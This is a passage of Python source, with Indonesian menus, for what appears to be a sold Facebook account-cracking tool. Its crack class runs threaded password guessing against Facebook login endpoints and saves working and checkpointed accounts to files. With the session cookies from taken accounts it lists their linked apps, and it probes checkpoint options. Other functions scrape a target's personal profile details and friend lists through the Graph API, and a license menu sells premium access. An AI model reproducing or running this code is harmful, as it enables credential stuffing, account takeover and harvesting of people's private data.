    samp_  = sam_.split(';')
    final = ('%s; %s; %s; %s; %s'%(samp_[4],samp_[1],samp_[0],samp_[5],samp_[3]))
    return final
def cek_apk(h_ok,_dapunta_):
    apk = []
    ses_ = requests.Session()
    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
    dat_game = ses_.get(url,cookies={'cookie':_dapunta_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n   • '+celeng)
        except:pass
    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
    dat_game = ses_.get(url2,cookies={'cookie':_dapunta_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n   • '+celeng)
        except:pass
    print(h_ok+''.join(apk))
def tahun(fx):
    if len(fx)==15:
        if fx[:10] in ['1000000000']       :tahunz = ' • 2009'
        elif fx[:9] in ['100000000']       :tahunz = ' • 2009'
        elif fx[:8] in ['10000000']        :tahunz = ' • 2009'
        elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' • 2009'
        elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' • 2010'
        elif fx[:6] in ['100001']          :tahunz = ' • 2010/2011'
        elif fx[:6] in ['100002','100003'] :tahunz = ' • 2011/2012'
        elif fx[:6] in ['100004']          :tahunz = ' • 2012/2013'
        elif fx[:6] in ['100005','100006'] :tahunz = ' • 2013/2014'
        elif fx[:6] in ['100007','100008'] :tahunz = ' • 2014/2015'
        elif fx[:6] in ['100009']          :tahunz = ' • 2015'
        elif fx[:5] in ['10001']           :tahunz = ' • 2015/2016'
        elif fx[:5] in ['10002']           :tahunz = ' • 2016/2017'
        elif fx[:5] in ['10003']           :tahunz = ' • 2018'
        elif fx[:5] in ['10004']           :tahunz = ' • 2019'
        elif fx[:5] in ['10005']           :tahunz = ' • 2020'
        elif fx[:5] in ['10006','10007','10008']:tahunz = ' • 2021'
        else:tahunz=''
    elif len(fx) in [9,10]:
        tahunz = ' • 2008/2009'
    elif len(fx)==8:
        tahunz = ' • 2007/2008'
    elif len(fx)==7:
        tahunz = ' • 2006/2007'
    else:tahunz=''
    return tahunz
class crack:
    def __init__(self,files):
        self.ada = []
        self.cp = []
        self.ko = 0
        print('')
        while True:
            try:
                while True:
                    try:
                        self.apk = files
                        self.fs = open(self.apk).read().splitlines()
                        break
                    except Exception as e:
                        print ("   %s"%(e))
                        continue
                self.fl = []
                os.system('rm -rf pass.txt')
                os.system('rm -rf passangka.txt')
                tambah_pass()
                tambah_pass_angka()
                for i in self.fs:
                    try:
                        self.fl.append({"id":i.split("•")[0],"pw":pass_dev(i.split("•")[1])})
                    except:continue
                start_method()
                put = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
                print('')
                if put in ['']:
                    jalan('%s[%s!%s] %sYang Bener Lah Kentod'%(M,P,M,P))
                    menu()
                elif put in ['1','01','001','a']:
                    print('%s[%s•%s] %sApakah Kamu Jomblo? [y/n]'%(K,P,K,K))
                    puf = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
                    if puf in ['']:
                        jalan('%s[%s!%s] %sYang Bener Lah Kentod'%(M,P,M,P))
                        menu()
                    elif puf in ['1','01','001','y','Y']:
       #                 cek_license()
                        started()
                        ThreadPool(35).map(self.api_opsi,self.fl)
                        os.remove(self.apk)
                        exit()
                        break
                    elif puf in ['2','02','002','n','N']:
                        started()
                        ThreadPool(35).map(self.api,self.fl)
                        os.remove(self.apk)
                        exit()
                        break
                    else:
                        jalan('%s[%s!%s] %sYang Bener Lah Kentod'%(M,P,M,P))
                        menu()
                elif put in ['2','02','002','b']:
                    print('%s[%s•%s] %sApakah Kamu Jomblo? [y/n]'%(K,P,K,K))
                    puf = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
                    if puf in ['']:
                        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                        menu()
                    elif puf in ['1','01','001','y','Y']:
      #                  cek_license()
                        started()
                        ThreadPool(35).map(self.mbasic_opsi,self.fl)
                        os.remove(self.apk)
                        exit()
                        break
                    elif puf in ['2','02','002','n','N']:
                        started()
                        ThreadPool(35).map(self.mbasic,self.fl)
                        os.remove(self.apk)
                        exit()
                        break
                    else:
                        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                        menu()
                elif put in ['3','03','003','c']:
                    print('%s[%s•%s] %sApakah Kamu Jomblo? [y/n]'%(K,P,K,K))
                    puf = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
                    if puf in ['']:
                        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                        menu()
                    elif puf in ['1','01','001','y','Y']:
    #                    cek_license()
                        started()
                        ThreadPool(35).map(self.free_opsi,self.fl)
                        os.remove(self.apk)
                        exit()
                        break
                    elif puf in ['2','02','002','n','N']:
                        started()
                        ThreadPool(35).map(self.free,self.fl)
                        os.remove(self.apk)
                        exit()
                        break
                    else:
                        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                        menu()
                else:
                    jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                    menu()
            except Exception as e:
                print(("   %s"%e))
    def api(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),
                    i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sCP%s] %s • %s • %s %s %s%s"%(K,P,K,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s • %s • %s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s • %s • %s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%sCP%s] %s • %s%s     "%(K,P,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s • %s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s • %s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sOK%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                    self.ada.append("%s • %s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s • %s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
        except:
            self.api(fl)
    def api_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),
                    i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sCP%s] %s • %s • %s %s %s%s"%(K,P,K,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s • %s • %s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s • %s • %s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%sCP%s] %s • %s%s     "%(K,P,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s • %s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s • %s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sOK%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                    print("")
                    self.ada.append("%s • %s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s • %s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
        except:
            self.api_opsi(fl)
    def mbasic(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sCP%s] %s • %s • %s %s %s%s"%(K,P,K,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s • %s • %s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s • %s • %s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%sCP%s] %s • %s%s     "%(K,P,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s • %s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s • %s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    self.ada.append("%s • %s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s • %s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
        except:
            self.mbasic(fl)
    def mbasic_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sCP%s] %s • %s • %s %s %s%s"%(K,P,K,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                        cek_log(fl.get("id"),i,h_cp)
                        print("")
                        self.cp.append("%s • %s • %s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s • %s • %s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    h_cp = "\r%s[%sCP%s] %s • %s%s     "%(K,P,K,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s • %s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s • %s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    print("")
                    self.ada.append("%s • %s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s • %s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
        except:
            self.mbasic_opsi(fl)
    def free(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_free(fl.get("id"),
                    i,"https://free.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sCP%s] %s • %s • %s %s %s%s"%(K,P,K,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s • %s • %s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s • %s • %s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%sCP%s] %s • %s%s     "%(K,P,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s • %s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s • %s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    self.ada.append("%s • %s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s • %s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
        except:
            self.free(fl)
    def free_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_free(fl.get("id"),
                    i,"https://free.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sCP%s] %s • %s • %s %s %s%s"%(K,P,K,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                        cek_log(fl.get("id"),i,h_cp)
                        print("")
                        self.cp.append("%s • %s • %s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s • %s • %s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    h_cp = "\r%s[%sCP%s] %s • %s%s     "%(K,P,K,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s • %s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s • %s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    print("")
                    self.ada.append("%s • %s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s • %s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
        except:
            self.free_opsi(fl)
def target():
    try:token = open('token.txt','r').read()
    except (KeyError,IOError):jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));menu_log()
    idt = input("%s[%s•%s] %sID Target : "%(K,P,K,B))
    try:
        zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);zy = json.loads(zx.text)
    except (KeyError,IOError):jalan('%s[%s!%s] %sID Not Found'%(M,P,M,P));menu()
    try:nm = zy["name"]
    except (KeyError,IOError):nm = ("-")
    try:nd = zy["first_name"]
    except (KeyError,IOError):nd = ("-")
    try:nt = zy["middle_name"]
    except (KeyError,IOError):nt = ("-")
    try:nb = zy["last_name"]
    except (KeyError,IOError):nb = ("-")
    try:ut = zy["birthday"]
    except (KeyError,IOError):ut = ("-")
    try:gd = zy["gender"]
    except (KeyError,IOError):gd = ("-")
    try:em = zy["email"]
    except (KeyError,IOError):em = ("-")
    try:lk = zy["link"]
    except (KeyError,IOError):lk = ("-")
    try:us = zy["username"]
    except (KeyError,IOError):us = ("-")
    try:rg = zy["religion"]
    except (KeyError,IOError):rg = ("-")
    try:rl = zy["relationship_status"]
    except (KeyError,IOError):rl = ("-")
    try:rls = zy["significant_other"]["name"]
    except (KeyError,IOError):rls = ("-")
    try:lc = zy["location"]["name"]
    except (KeyError,IOError):lc = ("-")
    try:ht = zy["hometown"]["name"]
    except (KeyError,IOError):ht = ("-")
    try:ab = zy["about"]
    except (KeyError,IOError):ab = ("-")
    try:lo = zy["locale"]
    except (KeyError,IOError):lo = ("-")
    jalan('%s[%s•%s] %sNama : %s'%(K,P,K,H,nm))
    jalan('%s[%s•%s] %sNama Depan : %s'%(K,P,K,H,nd))
    jalan('%s[%s•%s] %sNama Tengah : %s'%(K,P,K,H,nt))
    jalan('%s[%s•%s] %sNama Belakang : %s'%(K,P,K,H,nb))
    jalan('%s[%s•%s] %sTanggal Lahir : %s'%(K,P,K,H,ut))
    jalan('%s[%s•%s] %sGender : %s'%(K,P,K,H,gd))
    jalan('%s[%s•%s] %sEmail : %s'%(K,P,K,H,em))
    jalan('%s[%s•%s] %sLink : %s'%(K,P,K,H,lk))
    jalan('%s[%s•%s] %sUsername : %s'%(K,P,K,H,us))
    jalan('%s[%s•%s] %sAgama : %s'%(K,P,K,H,rg))
    jalan('%s[%s•%s] %sStatus Hubungan : %s'%(K,P,K,H,rl))
    jalan('%s[%s•%s] %sHubungaj Dengan : %s'%(K,P,K,H,rls))
    jalan('%s[%s•%s] %sTempat Tinggal : %s'%(K,P,K,H,lc))
    jalan('%s[%s•%s] %sTempat Asal : %s'%(K,P,K,H,ht))
    jalan('%s[%s•%s] %sTentang : %s'%(K,P,K,H,ab))
    jalan('%s[%s•%s] %sLocale : %s'%(K,P,K,H,lo))
    input('\n%s[ %sKembali %s]%s'%(K,P,K,P))
    menu()
def teman_target():
#    cek_license()
    it = input('%s[%s?%s] %sID Target : '%(K,P,K,P))
    try:
        token = open('token.txt','r').read()
        mm = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token))
        nn = json.loads(mm.text)
        print ('%s[%s•%s] %sNama : %s'%(K,P,K,H,nn['name']))
    except (KeyError,IOError):
        jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        menu_log()
    tt=[]
    te=[]
    lim = input('%s[%s?%s] %sLimit Dump : '%(K,P,K,P))
    print('%s%s'%(K,P))
    ada = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(it,lim,token))
    idi = json.loads(ada.text)
    for x in idi['data']:
        tt.append(x['id'])
    for id in tt:
        try:
            ada2 = requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(id,token))
            idi2 = json.loads(ada2.text)
            try:
                for b in idi2['data']:
                    te.append(b['id'])
            except KeyError:
                print('[!] Private')
            print('[•]',id,'•',len(te))
            te.clear()
        except KeyError:
            print('[!] Account Was Spam')
    input('\n[ Back ]')
    menu()
def hasil():
    clear()
    banner()
    jalan('\n%s[ %sFile Hasil Crack Anda %s]'%(K,P,K))
    print('\n%s[%s1%s] %sCek Hasil OK'%(K,P,K,H))
    print('%s[%s2%s] %sCek Hasil CP'%(K,P,K,K))
    ch = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
    if ch in ['']:
        jalan('%s[%s!%s] %sYang Bener Lah Kentod'%(M,P,M,P))
        menu()
    elif ch in ['1','01','001','a']:
        try:
            okl = os.listdir("OK")
            print('\n%s[%s Hasil Crack Akun OK %s]\n'%(K,P,H))
            for file in okl:
                print('%s[%s•%s] %s%s'%(K,P,K,P,file))
            files = input('\n%s[%s•%s] %sMasukan Nama File : '%(K,P,K,P))
            print('')
            if files == "":
                jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                hasil()
            os.system('cat OK/%s'%(files))
            ppp = open("OK/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            print('\n%s[%s•%s] %sHasil Crack Pada %s Adalah %s Akun'%(K,P,K,P,del1,len(ppp)))
        except (KeyError,IOError):
            print('%s[%s Gak Dapet Hasil Awokawok %s]'%(M,P,M))
    elif ch in ['2','02','002','b']:
        try:
            cpl = os.listdir("CP")
            print('\n%s[%s Hasil Crack Akun CP %s]\n'%(K,K,K))
            for file in cpl:
                print('%s[%s•%s] %s%s'%(K,P,K,P,file))
            files = input('\n%s[%s•%s] %sMasukan Nama File : '%(K,P,K,P))
            print('')
            if files == "":
                jalan('%s[%s!%s] %sYang Bener Lah Kentod'%(M,P,M,P))
                hasil()
            os.system('cat CP/%s'%(files))
            ppp = open("CP/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            print('\n%s[%s•%s] %sHasil Crack Pada %s Adalah %s Akun'%(K,P,K,P,del1,len(ppp)))
        except (KeyError,IOError):
            print('%s[%s Gak Dapet Hasil Awokawok %s]'%(M,P,M))
    else:
        jalan('%s[%s!%s] %sYang Bener Lah Kentod'%(M,P,M,P))
        menu()
    input('\n%s[ %sKembali %s]%s'%(K,P,K,P))
    menu()
def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("%s[%s!%s] %sAkun Terkena Spam"%(M,P,M,P))
    if "c_user" in ses.cookies:
        print("%s[%s✓%s] %sAkun One Tap"%(H,P,H,H))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        if(str(len(ngew))=="0"):
            print("%s[%s✓%s] %sAkun One Tap"%(H,P,H,H))
        else:
            print("%s[%s•%s] %sTerdapat %s Opsi "%(K,P,K,K,str(len(ngew))))
        for opt in range(len(ngew)):
            print(" "*3, str(opt+1)+". "+ngew[opt])
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        print("%s[%s!%s] %s%s"%(M,P,M,P,oh))
    else:
        print("%s[%s!%s] %sKata Sandi Salah !!"%(M,P,M,M))
def cek_hasil():
#    cek_license()
    jalan('%s[ %sCek Opsi Hasil Crack %s]'%(K,P,P))
    print('\n%s[%s•%s] %sFile Saved : CP/%s.txt'%(K,P,K,P,tanggal))
    files = input('%s[%s•%s] %sMasukan Nama File : '%(K,P,K,P))
    try:
        buka_baju = open(files,"r").readlines()
    except FileNotFoundError:
        print("%s[%s!%s] %sFile Nya Gak Ada Kentod"%(M,P,M,P))
        time.sleep(2); cek_hasil()
    print("%s[%s•%s] %sTotal Akun Adalah : %s"%(K,P,K,P,str(len(buka_baju))))
    print("")
    for memek in buka_baju:
        kontol = memek.replace("\n","")
        titid  = kontol.split("•")
        print("%s[%s•%s] %sCek Login : %s"%(K,P,K,P,kontol))
        try:
            log_hasil(titid[0], titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print("")
    print('%s[%s✓%s] %sCek Opsi Selesai'%(K,H,K,H))
    input('\n%s[ %sKembali %s]%s'%(K,P,K,K))
    menu()
def buy_license():
    clear()
    banner()
    jalan('%s[%s Menu License Key %s]'%(K,P,K))
    print('\n%s[%s1%s] %sBuy License Key'%(K,P,K,P))
    print('%s[%s2%s] %sLogin License Key'%(K,P,K,P))
    lz = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
    print('')
    if lz =="":
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
        menu()
    elif lz == "1":
        os.system('rm -rf license.txt')
        id1 = uuid.uuid4().hex[:5].upper()
        id2 = uuid.uuid4().hex[:5].upper()
        id3 = uuid.uuid4().hex[:5].upper()
        id4 = uuid.uuid4().hex[:5].upper()
        open("license.txt", "w").write(id1+"-"+id2+"-"+id3+"-"+id4)
        time.sleep(1)
        print("%s[%s•%s] %sYour License Key : %s%s"%(K,P,K,P,K,open("license.txt", "r").read()))
        print("%s[%s•%s] %sDont Forget To Copy License Key & Save To Notepad!"%(K,P,K,P))
        print("\n%s[ %sPrice List Premium Script Full Access %s]"%(K,P,K))
        print("%s[%s1%s] %s1 Month Access : %sRp 20.000 Or $2"%(K,P,K,P,K))
        print("%s[%s2%s] %sUnlimited Access : %sRp 50.000 Or $5"%(K,P,K,P,K))
        print("\n%s[ %sIsi Data Pendaftaran License Key %s]"%(K,P,K))
        nama = input("%s[%s•%s] %sYour Name : "%(K,P,K,P))
        email = input("%s[%s•%s] %sYour Email : "%(K,P,K,P))
        durasi = input("%s[%s•%s] %sDuration : "%(K,P,K,P))
        apikey = open("license.txt", "r").read()
        url_wa = "https://api.whatsapp.com/send?phone=6282245780524&text="
        tks = "Hello Admin, I Want To Buy Premium Script Full Access\n\n"+"[•] Name : "+nama+"\n[•] Email : "+email+"\n[•] Duration : "+durasi+"\n[•] License Key : "+apikey
        subprocess.check_output(["am", "start", url_wa+quote(tks)])
        input('\n%s[ %sBack %s]%s'%(K,P,K,P))
        menu()
    elif lz == "2":
        os.system('rm -rf license.txt')
        link = ("https://ngepetonline.000webhostapp.com/chek.php")
        project = ("premiumdapunta")
        key = input("%s[%s•%s] %sPut License Key : "%(K,P,K,P))
        cek = requests.get(link+"?project="+project+"&apikey="+key).json()
        if cek["status"] == "error":
            open("license.txt","w").write(key)
            print("\n%s[%s!%s] %sLicense Key Not Confirmed"%(M,P,M,P))
            time.sleep(1.0)
            menu()
        elif cek["status"] == "expired":
            open("license.txt","w").write(key)
            print("\n%s[%s!%s] %sLicense Key Was Expired"%(M,P,M,P))
            time.sleep(1.0)
            menu()
        else:
            open("license.txt","w").write(key)
            print("\n%s[%s!%s] %sLicense Key Confirmed"%(K,P,K,P))
            time.sleep(2.0)
            menu()
    else:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
        menu()
def cek_license():
    try:
        xd = open("license.txt","r").read()
        ow = requests.get(url_license + xd)
        p = json.loads(ow.text)
        k = p['username']
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    except:
        jalan('\n%s[%s•%s] %sYou Are A Free User'%(K,P,K,P))
        jalan('%s[%s•%s] %sIf You Want To Use This Feature'%(K,P,K,P))
        jalan('%s[%s•%s] %sBuy A License To The Admin First'%(K,P,K,P))
        exit()
def var_menu():
    print('%s[ %sPilih Metode Untuk Login %s]'%(K,P,K))
    print('\n%s[%s1%s] %sLogin Pakai Token'%(K,P,K,P))
    print('%s[%s2%s] %sLogin Pakai Cookie'%(K,P,K,P))
    print('%s[%s3%s] %sTutorial Menggunakan Script'%(K,P,K,P))
    print('%s[%s4%s] %sInfo Author & Team Project'%(K,P,K,P))
    print('%s[%s0%s] %sKeluar [Ahh Ngecrot]'%(K,P,K,M))
def var_tutor():
    mlaku('%s[%s Tips & Tutorial %s]'%(K,P,K))
    print('\n%s[%s1%s] %sHow To Get Token'%(K,P,K,P))
    print('%s[%s2%s] %sHow To Get Cookies'%(K,P,K,P))
